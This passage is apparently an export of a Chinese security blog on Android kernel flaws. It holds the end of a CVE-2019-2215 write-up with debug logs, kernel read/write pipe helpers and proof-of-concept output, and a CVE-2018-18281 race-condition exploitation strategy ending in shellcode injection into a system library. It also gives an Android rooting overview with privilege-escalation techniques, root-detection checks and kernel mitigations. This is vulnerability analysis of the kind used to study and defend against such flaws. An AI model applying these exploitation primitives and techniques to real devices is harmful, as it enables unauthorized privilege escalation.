-2-[cve_2215_poc]- copy_to_iter- addr:0:58&lt;4&gt;[ 1150.932677] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1:f6&lt;4&gt;[ 1152.937025] c3 4164&lt;4&gt;[ 1152.937025] c3 4164 -1-[cve_2215_poc]- skb_copy_datagram_iter-&gt;&gt;&gt;&gt;&lt;4&gt;[ 1152.937149] c3 4164&lt;4&gt;[ 1152.937149] c3 4164 -1-[cve_2215_poc]- copy_to_iter- addr:1 bytes:0x30 i-&gt;count:0x30 i-&gt;iov:0xffffffcc03dfecb0 i-&gt;nr_segs:0xe&lt;4&gt;[ 1152.937207] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:0:1&lt;4&gt;[ 1152.937236] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1:0&lt;4&gt;[ 1152.937263] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2:0&lt;4&gt;[ 1152.937291] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:3:0&lt;4&gt;[ 1152.937318] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:4:0&lt;4&gt;[ 1152.937345] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:5:0&lt;4&gt;[ 1152.937372] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:6:0&lt;4&gt;[ 1152.937399] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:7:0&lt;4&gt;[ 1152.937427] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:8:ef&lt;4&gt;[ 1152.937456] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:9:be&lt;4&gt;[ 1152.937484] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:a:ad&lt;4&gt;[ 1152.937512] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:b:de&lt;4&gt;[ 1152.937539] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:c:0&lt;4&gt;[ 1152.937567] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:d:0&lt;4&gt;[ 1152.937595] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:e:0&lt;4&gt;[ 1152.937622] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:f:0&lt;4&gt;[ 1152.937649] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:10:28&lt;4&gt;[ 1152.937678] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:11:0&lt;4&gt;[ 1152.937706] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:12:0&lt;4&gt;[ 1152.937733] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:13:0&lt;4&gt;[ 1152.937761] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:14:0&lt;4&gt;[ 1152.937789] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:15:0&lt;4&gt;[ 1152.937817] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:16:0&lt;4&gt;[ 1152.937845] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:17:0&lt;4&gt;[ 1152.937873] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:18:8&lt;4&gt;[ 1152.937901] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:19:2a&lt;4&gt;[ 1152.937928] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1a:e4&lt;4&gt;[ 1152.937955] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1b:a9&lt;4&gt;[ 1152.937983] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1c:cc&lt;4&gt;[ 1152.938010] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1d:ff&lt;4&gt;[ 1152.938038] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1e:ff&lt;4&gt;[ 1152.938065] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:1f:ff&lt;4&gt;[ 1152.938092] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:20:8&lt;4&gt;[ 1152.938120] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:21:0&lt;4&gt;[ 1152.938147] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:22:0&lt;4&gt;[ 1152.938176] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:23:0&lt;4&gt;[ 1152.938203] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:24:0&lt;4&gt;[ 1152.938231] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:25:0&lt;4&gt;[ 1152.938258] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:26:0&lt;4&gt;[ 1152.938285] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:27:0&lt;4&gt;[ 1152.938312] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:28:fe&lt;4&gt;[ 1152.938340] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:29:ff&lt;4&gt;[ 1152.938368] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2a:ff&lt;4&gt;[ 1152.938396] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2b:ff&lt;4&gt;[ 1152.938424] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2c:ff&lt;4&gt;[ 1152.938451] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2d:ff&lt;4&gt;[ 1152.938479] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2e:ff&lt;4&gt;[ 1152.938507] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:2f:ff&lt;4&gt;[ 1152.938534] c3 4164 -2-[cve_2215_poc]- copy_to_iter- addr:30:0&lt;4&gt;[ 1152.938559] c3 4164^C130|walleye:/ # 以上为调试信息，通过日志可以看到，内核一共调用了两次skb_copy_datagram_iter函数，该函数是把通过套接字接收到的数据写到msghdr.msg_iov指向的iovec结构体数组的iov_base元素指向的内存中，属于recvmsg的底层函数。第一次是把’X’(0x58)写到地址0xffffffcc03dfeca0中的指针指向的内存中。第二次则比较精巧，共写0x30个字节的数据，但分两次写。首先取0xffffffcc03dfecb0中的值并把取得的指针用作写入地址写入0x28(0x8+20x10)个字节的数据。这里的0xffffffcc03dfecb0刚好是binder_thread-&gt;wait.task_list.prev的地址，因为漏洞的原因task_list.prev的值被修改为了task_list地址(0xffffffcc03dfeca8)，这就相当于对binder_thread-&gt;wait.task_list做写操作，写入的数据如上所示(用户态写入的伪造数据)。因为只写0x28(0x8+20x10)个字节，所以末尾的0xfffffffffffffffe并不会在这次写入，这次覆盖只是为了去把我们伪造的内核地址写到0xffffffcc03dfecc0内存中。第二次写剩下的8个字节，因为0xffffffcc03dfecc0也属于一个iov_base，并且0xfffffffffffffffe还没开始写，所以最后的0xfffffffffffffffe就被写到前面覆盖的内核地址指向的内存中，因为这里使用的内核地址指向的是进程limit，所以实现了对进程limit的修改。这里的写操作还是挺巧妙的，不得不佩服作者。 1234日志代码格式if(!strcmp(\"cve-xxx-xxx\",get_current()-&gt;comm))&#123; ...&#125; 内核任意读写最后我们成功修改当前进程的limit之后就可以通过pipe组合对内核内存任意读写了，有了任意读写则可以修改关键结构体达到提权的效果。12345678910111213141516int kernel_rw_pipe[2];/* 内核任意写操作 */void kernel_write(unsigned long kaddr, void *buf, unsigned long len) &#123; errno = 0; if (len &gt; 0x1000) errx(1, \"kernel writes over PAGE_SIZE are messy, tried 0x%lx\", len); if (write(kernel_rw_pipe[1], buf, len) != len) err(1, \"kernel_write failed to load userspace buffer\"); if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, \"kernel_write failed to overwrite kernel memory\");&#125;/* 内核任意读操作 */void kernel_read(unsigned long kaddr, void *buf, unsigned long len) &#123; errno = 0; if (len &gt; 0x1000) errx(1, \"kernel writes over PAGE_SIZE are messy, tried 0x%lx\", len); if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) err(1, \"kernel_read failed to read kernel memory\"); if (read(kernel_rw_pipe[0], buf, len) != len) err(1, \"kernel_read failed to write out to userspace\");&#125; Poc测试1234567891011121314151617181920212223walleye:/data/local/tmp $ uname -aLinux localhost 4.4.116-gbcd0ecccd040-dirty #27 SMP PREEMPT Fri Jun 28 20:34:56 CST 2019 aarch64walleye:/data/local/tmp $ ./CVE-2019-2215Starting POCCHILD: Doing EPOLL_CTL_DEL.CHILD: Finished EPOLL_CTL_DEL.CHILD: Finished write to FIFO.writev() returns 0x2000PARENT: Finished calling READVcurrent_ptr == 0xffffffd790a9f000CHILD: Doing EPOLL_CTL_DEL.CHILD: Finished EPOLL_CTL_DEL.recvmsg() returns 49, expected 49should have stable kernel R/W nowcurrent-&gt;mm == 0xffffffd7b358c780current-&gt;mm-&gt;user_ns == 0xffffff9ae6daf1c8kernel base is 0xffffff9ae4c80000&amp;init_task == 0xffffff9ae6da57d0init_task.cred == 0xffffff9ae6db0a08current-&gt;cred == 0xffffffd7ac1bc0c0walleye:/data/local/tmp $ uname -aLinux localhost 4.4.116-gbcd0ecccd040-dirty EXPLOITED KERNEL aarch64walleye:/data/local/tmp $ 总结思考最后总结一下本次的UAF漏洞模型，动态申请的结构体变量的引用被添加到链表中，但在释放该结构体内存时并没有从链表中删除该变量的引用，导致利用该节点时出现释放后重引用的问题。一般这种链表拆卸漏洞最有可能出现内核地址任意读写漏洞。申请对象内存-&gt;添加到链表-&gt;释放内存-&gt;通过链表访问对象 时间线1232017-12-12 通过syzkaller发现该漏洞2018-02-03 Linux修复该漏洞2019-09-26 Google公司Project Zero小组发现并提交漏洞 相关资料公开链接补丁ExploitRootDemoRootDemo","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-18281","slug":"CVE-2018-18281","date":"2019-09-03T03:15:53.000Z","updated":"2019-10-26T03:30:49.283Z","comments":true,"path":"2019/09/03/CVE-2018-18281/","link":"","permalink":"http://github.com/2019/09/03/CVE-2018-18281/","excerpt":"","text":"CVE-2018-18281 背景页表(PT)和页表项(PTE)页表（PT）：包含有关虚拟地址如何映射到物理地址的信息。页表项（PTE）：页表中的条目我们称为页表项。 TLB基础概念TLB（Translation lookaside buffer）旁路转换缓冲区或称为页表缓存，又称为快表，主要存放一些页表中的条目（也就是虚拟地址到物理地址的转换表）。由于页表存储在主存储器中，通过主存储器查询页表所付出的代价比较大，由此产生了TLB概念。当处理器寻址时，不是直接在内存的物理地址中寻址，而是通过一组虚拟地址转换成主内存的物理地址进行寻址，我们常说的页表（PTE，page table页表存放在内存中）就是负责将虚拟地址翻译成实际物理地址的，TLB为了快速查找所以会缓存一些常用的PTE条目，而CPU则会优先查找TLB中的页表。如果TLB中正好存在所需要的页表条目，则称为TLB命中（TLB Hit）；如果TLB没有所需的页表条目，则称为TLB失败（TLB Miss），如果命中，接下来CPU再次查看TLB表中对应的物理地址中的数据是不是已经在CPU的一级，二级缓存中了（一级缓存和二级缓存中的内容都是内存中访问频率较高的数据的映射，它们的存在都是为了减少高速CPU对慢速内存的访问，通常CPU找数据或指令的顺序是：先到一级缓存中再到二级缓存中，如果还是没有找到那么就去内存中找）。如果不命中，则需要去内存中的页表中继续查找(转换)实际的物理地址，并将找到的PTE存到TLB中，覆盖TLB中不常用页表条目。如果需要解除某个虚拟地址与物理地址之间的映射除了要对主存储器中相关的表项做删除操作以外还需要对TLB缓存中该映射关系做清除，一般叫做TLB刷新。释放物理内存流程：1.从页表中删除对应的条目，但继续保持对它所指向的物理页面的引用。2.对可能使用了与当前线程相同页表的所有核心执行TLB刷新。3.删除物理页面上保留的引用，释放它。 漏洞成因漏洞描述根据描述我们得知该漏洞的主要原因是因为mremap( )函数与ftruncate( )函数的底层函数存在条件竞争问题，导致一块物理内存的释放后重用。这两个函数各自的作用？首先我们来看下这两个函数各自的作用：void mremap(void old_address, size_t old_size,size_t new_size, int flags, … / void new_address*/);：重新映射一块虚拟内存地址，更改虚拟地址与内存页面之间的映射关系。int ftruncate(int fd, off_t length);：将文件截断为精准长度字节的大小。若先前的文件大于此时指定的大小，额外的数据则会被丢弃，若大于源文件大小则扩展填充为空字节(‘\\0’) 漏洞原理竞争点在哪？以下列出具体的竞争函数调用链：sys_mremap() -&gt; mremap_to() -&gt; move_vma() -&gt; move_page_tables() -&gt; move_ptes() -&gt; 移动页表 sys_ftruncate() -&gt; do_sys_ftruncate() -&gt; do_truncate() -&gt; notify_change() -&gt; shmem_setattr() -&gt; unmap_mapping_range()-&gt;unmap_mapping_range_tree() -&gt; unmap_mapping_range_vma() -&gt; zap_page_range_single() -&gt; unmap_single_vma() -&gt; unmap_page_range() -&gt; zap_pud_range() -&gt; zap_pmd_range() -&gt; zap_pte_range() pmd(Page Middle Directory)：页面中间目录，用来存放页表。move_ptes( )函数首先获取旧地址的pmd锁，接着把旧地址的页表项(pte)设置给新地址的页表并清除掉旧地址的页表项，从而实现重映射的功能。最后解锁旧地址pmd，然后刷新TLB。 zap_pte_range( )函数的zap为zero all pages的缩写，作用是将pmd中从虚拟地址address开始，长度为size的内存块将其页表项(pte)清零并释放掉该空间的物理内存。 总结一下：由于mremap函数内部对内存进行重映射(A地址指向的内存让B地址去指向)时的解锁时机把握不合适，导致在解锁之后 TLB刷新之前存在一个竞争窗口，这个时间段之内TLB缓存中保存的数据都属于过时的数据，虽然在解锁之前已经删除了源地址(A地址)在页表中对应物理地址的页表项(PTE)，但TLB中却还保留着一份备份。如果我们存在一个与地址A绑定的内存文件，并通过ftruncate函数去抢占窗口并触发释放前面的物理页面(把阶段大小设置为比源文件小即可触发)，这可能出现一种情况就是虽然物理页面已经被释放掉但我们仍然可以通过A地址去访问这块物理页面。因为已经释放过了所以此时的物理页面可能已经被其他代码填充为了别的数据，这就造成了释放重用的问题。 补丁用意理解了漏洞原理我们来看下漏洞补丁：补丁挺简单，就是把TLB刷新移到了解锁之前，确保页表更改与TLB缓存刷新的原子性，避免了竞争导致TLB缓存与页表数据的不同步问题。 漏洞利用漏洞利用思路以下是该漏洞的利用思路：那么我们可以访问被释放的物理内存有什么用?怎么利用它去提权?1.首先确定我们要重引用时要分配的受害者页面。(系统共享库文件的一页代码段)2.创建一内存文件，并将它使用mmap映射为A。3.使用mremap对A进行重映射到B，移除A对于物理内存页表项，同时调用fallocate去触发竞争以释放相关的物理内存页面，而不删除A相应的TLB条目，成功则有了一个旧的TLB条目。4.读取受害者页面，促使内核重新分配释放的内存页面作为受害者页面的页面缓存条目。5.轮询访问A中的内容(通过旧的TLB条目)，判断是否包含受害者页面的数据。 如果包含表明已经将旧映射A转换为了受害者页面。此时就可以通过A任意覆盖受害者页面，达到代码注入的效果。7.最后触发我们写入的shellcode。 这里面有几个关键点：1.如何提高竞争效率？2.如何控制内存页的重分配？3.需要修改的受害者页面是什么？ 提高竞争效率内核的三种抢占模式做为攻击者的我们肯定希望竞争的窗口足够的大，这样才能更好的达到成功竞争的状态，那么如何去扩展这个窗口呢？这里涉及到一个linux内核中进程抢占的机制，内核抢占即指程序在执行系统调用时是否可以被抢占，也就是对当前进程进行暂时的挂起，使新唤醒的高优先级进程得到运行。 linux支持的抢占模式分为三种，在编译时指定选项。CONFIG_PREEMPT_NONE：不允许内核抢占，多用在服务器上。CONFIG_PREEMPT_VOLUNTARY：自愿内核抢占，在一些耗时较长的代码中主动调用cond_resched函数让出CPU。CONFIG_PREEMPT：允许完全内核抢占。就是内核代码可以在执行期间的任何时间被中断。 一般我们用的都是实时性系统所以都是可抢占式的，也就是较高优先级的任务可以抢占较低优先级任务的执行机会。对于我们来说这种抢占模式是非常有用的，我们可以让调度程序在竞争窗口中将目标进程从CPU核心中移除，从而扩大窗口增加竞争的命中率。 线程调度优先级所以我们可以把执行mremap函数的线程优先级设置低一些(SCHED_IDLE用于运行非常低优先级的后台作业)，这样只要保证mremap函数在执行flush_tlb_range刷新函数之前被抢占，那么竞争的窗口也就够大了。看下内核给我们提供的两个控制进程优先级的功能，1.通过设置线程调度的优先级int sched_setscheduler(pid_t pid, int policy,const struct sched_param* param)；该函数可以为pid指定的线程设置调度策略和参数。如果pid设置为0则表示设置当前线程的调用策略和参数。123SCHED_OTHER 标准的CFS调度策略;SCHED_BATCH 针对&quot;batch&quot; 类型的任务，切换没有SCHED_OTHER频繁;SCHED_IDLE 适用于以低优先级运行的后台任务。 如果设置具有不同优先级的多个进程运行在同个CPU核心上，那么唤醒的高优先级进程会抢占优先级较低的进程。所以我们还需要了解下CPU绑定相关函数 线程CPU绑定再来看下对执行线程进行CPU绑定的功能，sched_setaffinity(pid_t pid, unsigned int cpusetsize, cpu_set_t* mask)；该函数可以让pid指定的线程运行在mask设定的CPU上。若pid为0则表示当前线程。参数1：需要绑定亲和性的进程pid，如果为0则表示当前进程。参数2：cpu_set_t结构体大小参数3：cpu_set_t结构体，用来表示一个CPU集合，有以下几个宏可以对这个掩码集进行操作。123CPU_ZERO( )：清空集合。CPU_SET( )与CPU_CLR( )：分别代表将一个给定的CPU号加到集合中或从集合中去掉。CPU_ISSET( )：检查CPU是否在集合里面 整理一下逻辑，我们可以创建5个线程，分别为A，B，C，D，E。[1].主线程A：负责创建一个内存文件并通过mmap映射到地址0x10000处，通过监控系统文件获取竞争时机，通过pipe写对线程D做唤醒操作。在CPU(6)跑[2].被竞争线程B：调度级别被设置为SCHED_IDLE，使用mremap( )函数把映射文件从地址0x10000重新映射到地址0x20000。在CPU(3)跑[3].竞争线程D，启动后阻塞，等待主线程A帮忙解阻塞后 唤醒之后把线程[2]绑定到CPU3，使用ftruncate/fallocate对[1]中的文件做截断操作，触发竞争释放。在CPU(4)跑[4].酱油线程C，死循环，用来拖慢mremap的执行效率。在CPU(3)跑[5].检查线程E，不断读取0x10000的位置，判断内存的值是否已经被改变为我们预期的值，如果是则写入shellcode。在CPU(5)跑 页面重分配控制物理页面管理我们从利用的角度来看，希望将通过漏洞释放的物理内存尽可能快速的重新分配回来，那么我们还需要简单了解下linux物理内存的分配。linux页分配器基于buddy分配器，在mm/page_alloc.c中实现。空闲列表(freelist)不仅仅是按order区分，还与区域（zone）和迁移类型（migration type）有关。下面我们来看下这两个概念。 ZONE什么是ZONE(区域)，内核会把物理内存节点划分为多个内存管理区域，用于代表不同范围的内存，内核可以使用不同的映射方式映射物理内存。管理区被分为多个类型。以下列出比较关键的几个类型。ZONE_DMA：内存首部16MB，即低端范围的物理内存。ZONE_DMA32：标记了使用32位地址可寻址，适合DMA的内存域。ZONE_NORMAL：该部分内存可用于普通内核内存分配和用户空间内存，由内核直接映射到线性地址空间的较高部分。ZONE_HIGHMEM：该部分内存保留给系统使用，是系统中预留的可用内存空间，不能被内核直接映射。 迁移类型页面的迁移类型用来指定页面当前正在使用哪种分配（如果页面当前正在使用中）或者页面应该优先使用哪种分配（如果页面是空闲）。他的目的是通过将内核可以回收的页面的内容移动到一起以允许内核稍后可以通过移动数据来创建更大order的空闲页面。主要是应对过多内存碎片导致内存不够分配的问题。下面列出几个比较重要的迁移类型。MIGRATE_UNMOVABLE：内核不可移动的分配，核心内核分配的大部分页面都是属于这类。MIGRATE_MOVABLE：内核可以将其移动到另一个物理页面的分配，因为他们是通过页表映射的，只需要更新页表项，并把数据复制到新位置就行了。MIGRATE_RECLAIMABLE：内核不能简单地移动到不同地址的分配，但可以在需要一些内存时将其释放。MIGRATE_CMA：预留给驱动使用，但驱动不用的时候伙伴系统可以分配给用户进程作匿名内存或页缓存。 由于分配与上面几个类型相关，所以最好触发漏洞释放的物理页面和重新申请的物理页面的zone，migratetype一致，并且最好在同一个cpu核心上。因为触发漏洞所用到的内存是通过mmap映射的文件页面，这种分配大概率是从ZONE_NORMAL分配而来并且页面大概率是MIGRATE_MOVABLE（可移动页）的，所以我们希望快速从页面缓存中重新分配释放的也属于可移动页，因为将本来就是可移动的页重新分配为一个可移动的页比强制更改迁移类型更容易所以更快。不过由于使用这种策略我们就不能攻击普通内核内存分配和页表，但是可以攻击页缓存和匿名用户空间内存。 这里选择攻击页缓存，简单提一下什么是页缓存。linux系统内核为文件提供了一个缓存，目的是将一些磁盘上的数据缓存在RAM中，这样可以加快文件数据的访问，这个我们称为页缓存（page cache），为了执行提权攻击，我们需要在一个磁盘文件中挑选需要破坏的受害页面，把该页的页缓存来重新申请到目标物理页面，这样我们就拥有该页面的任意读写的权限，如果恰好这个文件是一个共享库（共享库一般都属于系统文件我们普通进程是没权限修改的）那么我们就可以利用漏洞来修改受害页面缓存达到对系统共享库修改的功能。 提高目标页缓存命中率我们现在需要解决如何控制race释放的页面刚好被目标页面使用？section VIII-B介绍了一种算法用于精准控制一个file page cache的加载。里面提到Linux页面缓存的替换算法优先考虑在可执行页面上驱逐不可执行页面，也就是可执行页面更容易驻留在内存中。首先从页缓存中驱逐出受害者页面，并且一旦被驱逐就不会从磁盘重新加载，直到下次访问它为止。但是内核有一些预读逻辑，我们不希望触发内核的预读逻辑，所以通过MADV_RANDOM(期望以随机顺序引用页面。因此，预读可能没有通常那么有用)的映射方式映射受害者文件的所有其他页来减少访问其他页触发预读逻辑的可能性。 驱逐受害者页面的思路首先打开一个大文件A，以可读可写可执行的方式mmap到内存，再打开目标文件B，mmap到内存中。通过在一个循环内按pagesize逐页面读取大文件A，促使内核申请创建大量page cache来装载文件A，由于A具有可执行标志所以造成内存压力迫使从page cache中删除其他文件页并交换到磁盘中。然后通过mincore函数判断B文件中的X页面（受害页）是否还存在内存中，如果不存在则跳出第一个循环进入第二个循环。第二个循环按pagesize逐页面读取B的内核，但跳过目标受害页X不读取，这就导致除了目标X之外其他页都会被重新装载回内存中。接着再通过mincore函数判断X是否在内存中，如果在内存中就跳到第一个大循环重新来过，否则说明我们已经成功驱逐受害者页面到磁盘中了。 通过上述算法，可以让目标文件的文件页面X被交换到磁盘，而该文件其他页面驻留在内存中，这样在漏洞触发之后，再来访问目标页面，则很大机会会被分配到刚刚释放的物理页面给目标页面。 mincore函数用来判断一个区域的内存是否在物理内存中或被交换给磁盘。 受害页数据系统库代码注入作者修改的是libandroid_runtime.so文件中com_android_internal_os_Zygote_nativeForkAndSpecialize函数的代码，该函数一般情况不会被调用的，只有启动新的app时才会通过zygote调用到这个函数，从而触发到我们注入的shellcode的执行，在zygote上下文获取一个任意代码执行的能力。 总结思考感觉这个洞的功能和脏牛漏洞还是有点类似，不过由于一些限制所以并没有脏牛那么好用。不过漏洞类型却挺有意思，比我们常见的UAF更底层，倾向于逻辑问题的UAF。 参考https://googleprojectzero.blogspot.com/2019/01/taking-page-from-kernels-book-tlb-issue.htmlhttps://www.360zhijia.com/anquan/442495.htmlhttp://jiayy.me/2019/02/15/CVE-2018-18281/","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"Android-Root总结","slug":"Android-Root总结","date":"2019-05-07T02:13:26.000Z","updated":"2019-07-05T16:44:16.001Z","comments":true,"path":"2019/05/07/Android-Root总结/","link":"","permalink":"http://github.com/2019/05/07/Android-Root总结/","excerpt":"","text":"Android-Root总结 前言Root介绍什么是Rootroot在linux中是超级管理员的意思，我们常说的获取root其实就是获取系统最高权限的意思。那为什么我们要获取系统的最高权限呢？最开始是因为某些手机厂商联合运行商，在手机中预装了许多烦人的应用来打造一个封闭的生态圈，并且一般用户是没有权限卸载这些应用的，强制用户使用这些应用。后来为了让手机用户摆脱厂商的这种限制，有人就搞出了对手机进行root的工具。通过这类工具可以获取系统最高权限，让被root后的手机用起来更舒服，更自由。比如卸载手机内置的烦人的软件，禁止开机启动项，实现对手机的各种定制化，在手机空间较小的情况下还可以用来优化手机。但是这些应用在方便了用户的同时也为病毒制作者开了一扇窗，对于被root后的手机病毒可以做的各种不可告人的操作也变得更多。因此各个手机厂商和Google就对android添加了各种保护机制和检测方法，避免手机被root。导致现在想要获取手机root远没有之前那般容易了。当然现今一些手机厂商也会内置root权限的开关，不过对于现在的手机远比以前的手机内存大，运行速度快所以国内root的需求也没有以前那么大了，现在对手机root可能更多是为了满足病毒，取证方面的需求吧。不过像国外的一些国家和我们几年前的情况差不多，目前还存在一定的手机root需求的。上图为root工具工作原理 如何获取Root目前我们比较常用的获取root方法有通过刷机获取，通过漏洞利用获取，一般刷机获取的话可能需要清空当前设备的数据在某些情况下存在局限性，所以最好就是利用漏洞去获取系统最高权限当然难度更高，然后在高权限下替换或添加权限管理程序也就是我们常说的su，比较常用的su程序包括SuperSU，Magisk。个人感觉Magisk比较好用。 常见的提权操作通过漏洞进行提权常规的套路就是利用一个低权限进程利用漏洞直接获取高权限，方法很多可以通过修改这个低权限进程内核中的关键结构体，或者直接调用内核提供的权限提升函数(commit_creds(prepare_kernel_cred(0)))，这种方法可能有时候需要patch内核代码(比如利用setreuid函数接口时)，又或者替换内核代码把内核在某种情况下要启动的可执行文件的路径改为我们自定义的路径(hotplug利用：ls -l /proc/sys/kernel/hotplug)，还有就是通过修改系统配置文件进行提权比如bootloader漏洞提权，以及利用漏洞替换系统文件进行提权DirtyCow的一个实例。在无法通过低权限提升到高权限的情况下我们也可以把目标转到已经存在高权限的进程中，通过这些高权限进程的漏洞，依然可以获取root权限。 临时root和永久rootroot还分为永久root和临时root，临时root就是在提权成功直到系统关机这段时间拥有root权限，每次系统重启后都需要重新进行提权。主要是Android4.4以及更高版本的系统在启动时内核会使用dm-verity功能进行验证启动，验证原理是最开始会建立一条从受硬件保护的信任根到引导加载程序，再到启动分区和其他已验证分区(system,vendor和可选的OEM分区)的完整信任链(加密散列树)。设备在启动时进入下个阶段之前会先校验下个阶段的完整性和真实性。这样就有效阻止了提权时植入的拥有持久Root权限的Rootkit。除了有系统完整性检查以外还内置了回滚保护机制，避免攻击者回滚到之前存在漏洞的系统进行攻击。存在回滚保护的设备只会更新到更高的Android系统。实现原理就是使用防篡改的存储空间记录最新一次android版本的信息。并在Android版本低于记录的版本时拒绝启动Android。加密散列树的原理就是把数据按4k为一块，树中每个节点都是加密hash，其中叶节点包含物理数据块的hash，并且中间节点包含其子节点的hash。因为根节点中的哈希是基于所有子节点的值，所以只有根节点被信任才能验证树的其余部分，对于任何一个节点块的修改都会破坏整个加密hash。 缓解措施一些root的检测方法下面列出一些用来检测手机是否被root的方法，都是一些比较简单的检测，存在各自的缺点，没有通用的检测方法，还是需要根据实际情况灵活使用。 检查是否存在权限管理应用 123456789101112131415手动检查：ls -l /system/app/Superuser.apkpm list packages | grep eu.chainfire.supersupm list packages | grep magisk自动检查：public static boolean checkSuperuserApk()&#123; try &#123; File file = new File(\"/system/app/Superuser.apk\"); if (file.exists()) &#123; Log.i(LOG_TAG,\"/system/app/Superuser.apk exist\"); return true; &#125; &#125; catch (Exception e) &#123; &#125; return false; &#125; 检查是否存在不需要的二进制文件，路径可能不一致。 12345678910111213141516171819202122手动检查：ls -l /system/bin/su /system/xbin/suls -l system/su /system/bin/.ext/.suls -l /system/usr/we-need-root/su-backupfind / -name \"*su*\" 2&gt;/dev/null /*搜索根目录下所有文件，列出名字带su的文件路径*/自动检查：public static boolean checkRootPathSU() &#123; File f=null; final String kSuSearchPaths[]=&#123;\"/system/bin/\",\"/system/xbin/\",\"/system/sbin/\",\"/sbin/\",\"/vendor/bin/\"&#125;; try&#123; for(int i=0;i&lt;kSuSearchPaths.length;i++) &#123; f=new File(kSuSearchPaths[i]+\"su\"); if(f!=null&amp;&amp;f.exists()) &#123; Log.i(LOG_TAG,\"find su in : \"+kSuSearchPaths[i]); return true; &#125; &#125; &#125;catch(Exception e) &#123; e.printStackTrace(); &#125; return false; &#125; 检查shell权限的id 12id | grep rootps | grep adbd | grep root 检查文件系统的读写属性是否被更改(RW等) 123456手动检查：bullhead:/ $ mount | grep system/dev/block/mmcblk0p41 on /system type ext4 (ro,seclabel,relatime,inode_readahead_blks=8)/dev/block/mmcblk0p41 on /sbin/.core/mirror/system type ext4 (ro,seclabel,relatime,inode_readahead_blks=8)ls -lR /system | grep -e :$ -e [r-][w-]xls -laR /system | grep [r-][w-]s[-r' '] 检查当前设备使用的是否为自定义内核，通过设备的ro.build.tags值来区分”test-keys”表示测试版，”release-keys”表示发布版，当然这种方法也可能误报。1234567891011walleye:/ $ getprop | grep ro.build.tags[ro.build.tags]: [release-keys]public static boolean checkDeviceDebuggable()&#123; String buildTags = android.os.Build.TAGS; if (buildTags != null &amp;&amp; buildTags.contains(\"test-keys\")) &#123; Log.i(LOG_TAG,\"buildTags=\"+buildTags); return true; &#125; return false; &#125; 开源的Root检查项目：检测Rooot项目-RootBeer反检测Root项目-Rootcloak 内核层的缓解措施内核版本3.4： mmap_min_addr(zero-page restrict)：限制mmap函数可映射的最低地址：缓解机制：因为没有对mmap地址范围做任何限制，应用层可以映射0页面，null pointer deref漏洞当时就是利用这个机制进行提权，后期针对这种漏洞推出了mmap_min_addr线程，限制mmap可以映射的最低地址，目前null pointer deref漏洞只能做一般的dos攻击 Kernel Address Display Restriction/dmesg restrictions：由于之前常用提权套路是从/proc/kallsyms搜索符号commit_creds和prepare_kernel_cred的地址，然后在用户态通过这两个符号构造提权函数，接着利用漏洞改写某个内核函数指针，将其函数指针替换为前面构造的提权函数，最后在用户态调用被改写的fsync函数，这样内核就直接执行用户态的提权函数完成提权，后期内核推出了该机制使得默认配置下无法从/proc/kallsyms等接口获取内核符号的地址 123456/proc/sys/kernel/dmesg_restrict/proc/sys/kernel/kptr_restrict选项:用来过滤一些地址，以此避免将内核地址泄漏给攻击者，通过配置kptr_restrict的值来控制是否开启: * 0:完全禁止 * 